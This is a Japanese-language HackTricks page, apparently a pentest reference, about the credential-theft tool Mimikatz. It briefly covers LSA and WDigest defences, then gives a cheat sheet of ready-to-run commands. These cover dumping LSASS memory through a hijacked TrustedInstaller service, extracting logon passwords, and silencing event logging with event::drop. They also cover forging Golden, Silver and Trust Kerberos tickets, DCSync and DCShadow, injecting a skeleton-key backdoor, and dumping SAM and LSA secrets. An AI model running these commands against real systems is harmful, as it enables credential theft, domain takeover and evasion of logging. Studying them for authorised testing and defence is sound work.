# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のものに基づいています**。詳細については元のページを確認してください！

## LM とメモリ内の平文

Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を防ぐための重要な対策が実施されています：

- **LM ハッシュと平文パスワード** はセキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。

- **LSA 保護** は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護の有効化には：
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ でレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
2. このレジストリ変更を管理されたデバイス全体に強制するグループポリシーオブジェクト (GPO) を実装します。

これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。

### SeDebugPrivilege 削除への対抗

管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行することができます：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
これにより、`lsass.exe` メモリをファイルにダンプし、別のシステムで分析して資格情報を抽出することができます：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz オプション

Mimikatz におけるイベントログの改ざんは、主に二つのアクションを含みます：イベントログのクリアと新しいイベントのログ記録を防ぐためのイベントサービスのパッチ適用。以下はこれらのアクションを実行するためのコマンドです：

#### イベントログのクリア

- **コマンド**：このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡しにくくします。
- Mimikatz は、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準のドキュメントには提供していません。しかし、イベントログの操作は通常、特定のログをクリアするために Mimikatz の外部でシステムツールやスクリプトを使用することを含みます（例：PowerShell や Windows Event Viewer を使用）。

#### 実験的機能：イベントサービスのパッチ適用

- **コマンド**：`event::drop`
- この実験的コマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
- 例：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` コマンドは、Mimikatz がシステムサービスを変更するために必要な特権で動作することを保証します。
- 次に、`event::drop` コマンドがイベントログサービスをパッチ適用します。

### Kerberos チケット攻撃

### ゴールデンチケットの作成

ゴールデンチケットは、ドメイン全体へのアクセスのなりすましを可能にします。主なコマンドとパラメータ：

- コマンド：`kerberos::golden`
- パラメータ：
- `/domain`：ドメイン名。
- `/sid`：ドメインのセキュリティ識別子 (SID)。
- `/user`：なりすますユーザー名。
- `/krbtgt`：ドメインの KDC サービスアカウントの NTLM ハッシュ。
- `/ptt`：チケットをメモリに直接注入します。
- `/ticket`：後で使用するためにチケットを保存します。

例：
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticketsは特定のサービスへのアクセスを許可します。主なコマンドとパラメータ：

- コマンド：Golden Ticketに似ていますが、特定のサービスをターゲットにします。
- パラメータ：
- `/service`：ターゲットとするサービス（例：cifs、http）。
- その他のパラメータはGolden Ticketに似ています。

例：
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### トラストチケットの作成

トラストチケットは、信頼関係を利用してドメイン間でリソースにアクセスするために使用されます。主なコマンドとパラメータ：

- コマンド：ゴールデンチケットに似ていますが、信頼関係用です。
- パラメータ：
- `/target`: ターゲットドメインのFQDN。
- `/rc4`: トラストアカウントのNTLMハッシュ。

例：
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 追加のKerberosコマンド

- **チケットのリスト**:

- コマンド: `kerberos::list`
- 現在のユーザーセッションのすべてのKerberosチケットをリストします。

- **キャッシュを渡す**:

- コマンド: `kerberos::ptc`
- キャッシュファイルからKerberosチケットを注入します。
- 例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **チケットを渡す**:

- コマンド: `kerberos::ptt`
- 別のセッションでKerberosチケットを使用できるようにします。
- 例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **チケットを消去**:
- コマンド: `kerberos::purge`
- セッションからすべてのKerberosチケットをクリアします。
- チケット操作コマンドを使用する前に、競合を避けるために便利です。

### Active Directoryの改ざん

- **DCShadow**: ADオブジェクト操作のために一時的にマシンをDCとして機能させます。

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DCを模倣してパスワードデータを要求します。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 認証情報アクセス

- **LSADUMP::LSA**: LSAから認証情報を抽出します。

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。

- _元の文脈ではNetSyncのための特定のコマンドは提供されていません。_

- **LSADUMP::SAM**: ローカルSAMデータベースにアクセスします。

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: レジストリに保存された秘密を復号化します。

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーの新しいNTLMハッシュを設定します。

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 信頼認証情報を取得します。
- `mimikatz "lsadump::trust" exit`

### その他

- **MISC::Skeleton**: DCのLSASSにバックドアを注入します。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 権限昇格

- **PRIVILEGE::Backup**: バックアップ権限を取得します。

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: デバッグ権限を取得します。
- `mimikatz "privilege::debug" exit`

### 認証情報ダンプ

- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの認証情報を表示します。

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
- `mimikatz "sekurlsa::tickets /export" exit`

### SIDとトークンの操作

- **SID::add/modify**: SIDとSIDHistoryを変更します。

- 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 修正: _元の文脈では修正のための特定のコマンドは提供されていません。_

- **TOKEN::Elevate**: トークンを偽装します。
- `mimikatz "token::elevate /domainadmin" exit`

### ターミナルサービス

- **TS::MultiRDP**: 複数のRDPセッションを許可します。

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDPセッションをリストします。
- _元の文脈ではTS::Sessionsのための特定のコマンドは提供されていません。_

### ボールト

- Windows Vaultからパスワードを抽出します。
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
